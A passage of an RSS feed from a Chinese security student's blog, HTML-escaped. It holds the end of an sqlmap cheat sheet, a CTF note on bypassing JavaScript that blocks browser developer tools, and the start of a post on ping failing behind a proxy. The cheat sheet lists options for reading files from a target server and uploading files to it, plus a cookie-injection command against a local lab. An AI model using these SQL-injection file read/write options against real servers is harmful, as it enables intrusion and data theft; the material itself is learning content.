&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--&lt;span style=&#34;color:#268bd2&#34;&gt;file&lt;/span&gt;-&lt;span style=&#34;color:#268bd2&#34;&gt;read&lt;/span&gt; &lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;c:/test.txt&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;#读取目标服务器C盘下的test.txt文件&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--&lt;span style=&#34;color:#268bd2&#34;&gt;file&lt;/span&gt;-&lt;span style=&#34;color:#268bd2&#34;&gt;write&lt;/span&gt;  &lt;span style=&#34;color:#268bd2&#34;&gt;test&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;txt&lt;/span&gt;  --&lt;span style=&#34;color:#268bd2&#34;&gt;file&lt;/span&gt;-&lt;span style=&#34;color:#268bd2&#34;&gt;dest&lt;/span&gt; &lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;e:/hack.txt&amp;#34;&lt;/span&gt;  &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;#将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--&lt;span style=&#34;color:#268bd2&#34;&gt;proxy&lt;/span&gt;=&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;http://127.0.0.1:8080&amp;#34;&lt;/span&gt;    &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;#指定代理&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--&lt;span style=&#34;color:#268bd2&#34;&gt;prefix&lt;/span&gt;=&lt;span style=&#34;color:#268bd2&#34;&gt;PREFIX&lt;/span&gt;     &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;#注入payload字符串前缀&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--&lt;span style=&#34;color:#268bd2&#34;&gt;suffix&lt;/span&gt;=&lt;span style=&#34;color:#268bd2&#34;&gt;SUFFIX&lt;/span&gt;     &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;#注入payload字符串后缀&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用星号（*）来指定注入点&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python sqlmap.py -u &amp;#34;http://127.0.0.1/Less-20/?id=1&amp;#34; --cookie=&amp;#34;uname=admin*&amp;#34; --banner
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;提示：&lt;code&gt;custom injection marker (&#39;*&#39;) found in option &#39;--headers/--user-agent/--referer/--cookie&#39;. Do you want to process it? [Y/n/q]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;更多更全的命令可以参考下面博客：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.freebuf.com/sectool/164608.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.freebuf.com/sectool/164608.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;或者官方文档……&lt;/p&gt;
&lt;p&gt;ps：感觉根据实际环境来修改现有的工具进行利用才是最nice的！&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/whatday/article/details/62059263&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://blog.csdn.net/whatday/article/details/62059263&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.anquanke.com/post/id/235846&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.anquanke.com/post/id/235846&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>绕过禁用F12</title>
        <link>https://proben1.github.io/2021/%E7%BB%95%E8%BF%87%E7%A6%81%E7%94%A8f12/</link>
        <pubDate>Sun, 05 Dec 2021 00:00:19 +0800</pubDate>
        
        <guid>https://proben1.github.io/2021/%E7%BB%95%E8%BF%87%E7%A6%81%E7%94%A8f12/</guid>
        <description>&lt;p&gt;今天做题的时候，遇到了这个，一按F12，就弹出hacker&lt;/p&gt;
&lt;p&gt;以前还真没遇见过，搜了一下，原来是js&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;!&lt;span style=&#34;color:#268bd2&#34;&gt;DOCTYPE&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;PUBLIC&lt;/span&gt; &lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;-//W3C//DTD XHTML 1.0 Transitional//EN&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&amp;#34;&lt;/span&gt;&amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#268bd2&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;xmlns&lt;/span&gt;=&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;http://www.w3.org/1999/xhtml&amp;#34;&lt;/span&gt;&amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#268bd2&#34;&gt;head&lt;/span&gt;&amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;&lt;span style=&#34;color:#268bd2&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;http&lt;/span&gt;-&lt;span style=&#34;color:#268bd2&#34;&gt;equiv&lt;/span&gt;=&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;Content-Type&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;content&lt;/span&gt;=&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;text/html; charset=utf-8&amp;#34;&lt;/span&gt; /&amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;&lt;span style=&#34;color:#268bd2&#34;&gt;title&lt;/span&gt;&amp;gt;&amp;lt;/title&amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;&lt;span style=&#34;color:#268bd2&#34;&gt;style&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;type&lt;/span&gt;=&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;text/css&amp;#34;&lt;/span&gt;&amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;/*禁止选中文字*/&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#268bd2&#34;&gt;body&lt;/span&gt;{ 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        -&lt;span style=&#34;color:#268bd2&#34;&gt;moz&lt;/span&gt;-&lt;span style=&#34;color:#268bd2&#34;&gt;user&lt;/span&gt;-&lt;span style=&#34;color:#268bd2&#34;&gt;select&lt;/span&gt;: &lt;span style=&#34;color:#268bd2&#34;&gt;none&lt;/span&gt;; &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;/*火狐*/&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        -&lt;span style=&#34;color:#268bd2&#34;&gt;webkit&lt;/span&gt;-&lt;span style=&#34;color:#268bd2&#34;&gt;user&lt;/span&gt;-&lt;span style=&#34;color:#268bd2&#34;&gt;select&lt;/span&gt;: &lt;span style=&#34;color:#268bd2&#34;&gt;none&lt;/span&gt;; &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;/*webkit浏览器*/&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        -&lt;span style=&#34;color:#268bd2&#34;&gt;ms&lt;/span&gt;-&lt;span style=&#34;color:#268bd2&#34;&gt;user&lt;/span&gt;-&lt;span style=&#34;color:#268bd2&#34;&gt;select&lt;/span&gt;: &lt;span style=&#34;color:#268bd2&#34;&gt;none&lt;/span&gt;; &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;/*IE10*/&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        -&lt;span style=&#34;color:#268bd2&#34;&gt;khtml&lt;/span&gt;-&lt;span style=&#34;color:#268bd2&#34;&gt;user&lt;/span&gt;-&lt;span style=&#34;color:#268bd2&#34;&gt;select&lt;/span&gt;: &lt;span style=&#34;color:#268bd2&#34;&gt;none&lt;/span&gt;; &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;/*早期浏览器*/&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#268bd2&#34;&gt;user&lt;/span&gt;-&lt;span style=&#34;color:#268bd2&#34;&gt;select&lt;/span&gt;: &lt;span style=&#34;color:#268bd2&#34;&gt;none&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;/style&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/head&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#268bd2&#34;&gt;body&lt;/span&gt;&amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;&lt;span style=&#34;color:#268bd2&#34;&gt;p&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#268bd2&#34;&gt;Test&lt;/span&gt;&amp;lt;/p&amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#268bd2&#34;&gt;script&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;type&lt;/span&gt;=&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#39;text/javascript&amp;#39;&lt;/span&gt;&amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;//禁用右键（防止右键查看源代码） 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;oncontextmenu&lt;/span&gt;=&lt;span style=&#34;color:#859900&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#859900&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#859900;font-weight:bold&#34;&gt;false&lt;/span&gt;;} 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;//禁止任何键盘敲击事件（防止F12和shift+ctrl+i调起开发者工具） 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;onkeydown&lt;/span&gt; = &lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;onkeyup&lt;/span&gt; = &lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;onkeypress&lt;/span&gt; = &lt;span style=&#34;color:#859900&#34;&gt;function&lt;/span&gt; () { 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;event&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;returnValue&lt;/span&gt; = &lt;span style=&#34;color:#859900;font-weight:bold&#34;&gt;false&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#859900&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#859900;font-weight:bold&#34;&gt;false&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;//如果用户在工具栏调起开发者工具，那么判断浏览器的可视高度和可视宽度是否有改变，如有改变则关闭本页面 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#859900&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;h&lt;/span&gt; = &lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;innerHeight&lt;/span&gt;,&lt;span style=&#34;color:#268bd2&#34;&gt;w&lt;/span&gt;=&lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;innerWidth&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;onresize&lt;/span&gt; = &lt;span style=&#34;color:#859900&#34;&gt;function&lt;/span&gt; () { 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#859900&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#268bd2&#34;&gt;h&lt;/span&gt;!= &lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;innerHeight&lt;/span&gt;||&lt;span style=&#34;color:#268bd2&#34;&gt;w&lt;/span&gt;!=&lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;innerWidth&lt;/span&gt;){ 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;close&lt;/span&gt;(); 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;location&lt;/span&gt; = &lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;about:blank&amp;#34;&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;/*好吧，你的开发者工具是单独的窗口显示，不会改变原来网页的高度和宽度， 但是你只要修改页面元素我就重新加载一次数据,让你无法修改页面元素（不支持IE9以下浏览器）*/&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#859900&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;addEventListener&lt;/span&gt;){ 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;addEventListener&lt;/span&gt;(&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;DOMCharacterDataModified&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#859900&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;reload&lt;/span&gt;();}, &lt;span style=&#34;color:#859900;font-weight:bold&#34;&gt;true&lt;/span&gt;); 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;addEventListener&lt;/span&gt;(&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;DOMAttributeNameChanged&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#859900&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;reload&lt;/span&gt;();}, &lt;span style=&#34;color:#859900;font-weight:bold&#34;&gt;true&lt;/span&gt;); 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;addEventListener&lt;/span&gt;(&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;DOMCharacterDataModified&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#859900&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;reload&lt;/span&gt;();}, &lt;span style=&#34;color:#859900;font-weight:bold&#34;&gt;true&lt;/span&gt;); 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;addEventListener&lt;/span&gt;(&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;DOMElementNameChanged&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#859900&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;reload&lt;/span&gt;();}, &lt;span style=&#34;color:#859900;font-weight:bold&#34;&gt;true&lt;/span&gt;); 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;addEventListener&lt;/span&gt;(&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;DOMNodeInserted&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#859900&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;reload&lt;/span&gt;();}, &lt;span style=&#34;color:#859900;font-weight:bold&#34;&gt;true&lt;/span&gt;); 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;addEventListener&lt;/span&gt;(&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;DOMNodeInsertedIntoDocument&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#859900&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;reload&lt;/span&gt;();}, &lt;span style=&#34;color:#859900;font-weight:bold&#34;&gt;true&lt;/span&gt;); 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;addEventListener&lt;/span&gt;(&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;DOMNodeRemoved&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#859900&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;reload&lt;/span&gt;();}, &lt;span style=&#34;color:#859900;font-weight:bold&#34;&gt;true&lt;/span&gt;); 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;addEventListener&lt;/span&gt;(&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;DOMNodeRemovedFromDocument&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#859900&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;reload&lt;/span&gt;();}, &lt;span style=&#34;color:#859900;font-weight:bold&#34;&gt;true&lt;/span&gt;); 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;addEventListener&lt;/span&gt;(&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;DOMSubtreeModified&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#859900&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#cb4b16&#34;&gt;window&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;reload&lt;/span&gt;();}, &lt;span style=&#34;color:#859900;font-weight:bold&#34;&gt;true&lt;/span&gt;); 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/script&amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/body&amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/html&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;JavaScript 实现禁止打开控制台（右键/工具栏/F12/Shift+Ctrl+I）&lt;/p&gt;
&lt;p&gt;判断浏览器的可视高度和可视宽度是否有改变，清奇的思路。&lt;/p&gt;
&lt;p&gt;把开发者工具是单独的窗口显示就好。&lt;/p&gt;
&lt;p&gt;还有，就是先造个本地网站的404页面，在那里把开发者工具打开，然后再回来。&lt;/p&gt;
&lt;p&gt;还有可以试试：&lt;/p&gt;
&lt;p&gt;ctrl+shift+i&lt;/p&gt;
&lt;p&gt;ctrl+shift+j&lt;/p&gt;
&lt;p&gt;ctrl+u&lt;/p&gt;
</description>
        </item>
        <item>
        <title>怎么ping不了</title>
        <link>https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/</link>
        <pubDate>Thu, 11 Nov 2021 03:32:29 +0800</pubDate>
        
        <guid>https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/</guid>
        <description>&lt;img src="https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/whynotping.jpg" alt="Featured image of post 怎么ping不了" /&gt;&lt;h1 id=&#34;前言&#34;&gt;前言
&lt;/h1&gt;&lt;p&gt;关于为什么要取一个这么沙雕的名字是有原因的，是因为一个冬至的晚上我想用&lt;code&gt;hexo d&lt;/code&gt;来把更新的博客上传到github pages上去，然而很不巧的是它给我报了这样一个错误：&lt;/p&gt;
&lt;p&gt;Error！！&lt;/p&gt;
&lt;p&gt;好吧截图暂时复现不到了，它的意思大概是无法和github进行连接。明明挂了梯子，可以在谷歌上搜索东西，甚至把clash的全局代理打开了，为什么不能在windows终端里连接到github呢？于是我想确认一下这终端是不是真的连上了代理，就做了一件事情：ping google.com&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 269; 
			flex-basis: 646px&#34;
	&gt;
	&lt;a href=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/HhCprvVJQkKbY4Z.png&#34; data-size=&#34;536x199&#34;&gt;
		&lt;img src=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/HhCprvVJQkKbY4Z.png&#34;
			width=&#34;536&#34;
			height=&#34;199&#34;
			srcset=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/HhCprvVJQkKbY4Z_hu7871a386e4168688896864e0351ebfe5_14787_480x0_resize_box_3.png 480w, https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/HhCprvVJQkKbY4Z_hu7871a386e4168688896864e0351ebfe5_14787_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;HhCprvVJQkKbY4Z&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;HhCprvVJQkKbY4Z&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;md，然后我就开始想为什么ping不通google。&lt;/p&gt;
&lt;h1 id=&#34;要说的话&#34;&gt;要说的话
&lt;/h1&gt;&lt;p&gt;2021届安全组的成员们，注意啦！！！&lt;/p&gt;
